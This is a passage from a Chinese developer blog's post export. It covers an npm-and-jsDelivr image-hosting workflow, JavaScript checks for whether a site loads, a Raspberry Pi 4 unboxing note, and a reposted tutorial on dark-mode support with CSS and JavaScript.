   <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = 